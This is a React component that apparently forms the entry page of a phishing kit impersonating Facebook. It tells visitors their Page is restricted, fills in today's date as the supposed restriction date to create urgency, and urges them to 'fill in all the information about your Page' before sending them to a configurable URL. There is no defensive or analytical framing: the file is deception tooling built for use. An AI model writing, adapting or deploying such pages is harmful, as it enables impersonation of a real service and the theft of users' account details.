import HeroImage from '@assets/hero-image-2.png';
import { faAddressCard, faCheck } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import getToday from '@utils/getToday';
import React, { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import getConfig from '@utils/config';
const Index: React.FC = () => {
	const navigate = useNavigate();
	const [today, setToday] = useState<string | undefined>(undefined);
	const [businessUrl, setBusinessUrl] = useState<string>('');

	useEffect(() => {
		const todayDate = getToday();
		setToday(todayDate);

		const fetchConfig = async () => {
			try {
				const response = await getConfig();
				setBusinessUrl(response.router.business_url);
			} catch (error) {
				console.error('Error fetching config:', error);
			}
		};
		fetchConfig();
	}, []);

	return (
		<div className='flex min-h-screen flex-col items-center justify-center py-8'>
			<div className='flex w-11/12 flex-col gap-4 rounded-lg md:w-2/5 2xl:w-1/3'>
				<img src={HeroImage} alt='Hero' className='rounded-t-lg' />
				<b className='text-2xl'>Welcome To Facebook Protect.</b>
				<p>
					Your page's accessibility is limited, so we ask that higher
					security requirements be applied to that account. We created
					this security program to unlock your Pages. <br />
					<a
						href='#'
						target='_blank'
						className='text-blue-500 hover:underline'
						rel='noreferrer'
					>
						More information
					</a>
				</p>

				<div className='px-4'>
					<ol className='relative flex flex-col gap-5 border-s-2 border-s-gray-200'>
						<li className='mb-10 ms-6 pb-4'>
							<div className='absolute -start-4 flex items-center justify-start gap-2'>
								<FontAwesomeIcon
									icon={faCheck}
									size='lg'
									className='h-4 w-4 rounded-full bg-gray-400 p-2 text-white ring-2 ring-white'
								/>
								<p>
									First, fill in all the information about your Page.
								</p>
							</div>
						</li>
						<li className='mb-10 ms-6'>
							<div className='absolute -start-4 flex items-center justify-start gap-2'>
								<FontAwesomeIcon
									icon={faAddressCard}
									size='xs'
									className='h-4 w-4 rounded-full bg-blue-500 p-2 text-white ring-2 ring-white'
								/>
								<p>
									Next, confirm the page usage policy requirements.
								</p>
							</div>
						</li>
					</ol>
				</div>
				<div className='mt-6 md:mt-3'>
					<button
						className='w-full rounded-lg bg-blue-500 p-3 font-semibold text-white'
						onClick={() => {
							navigate(`${businessUrl}/home`);
						}}
					>
						Continue
					</button>
				</div>
				<p className='text-center'>
					Your page was restricted on <b>{today}</b>
				</p>
			</div>
		</div>
	);
};

export default Index;
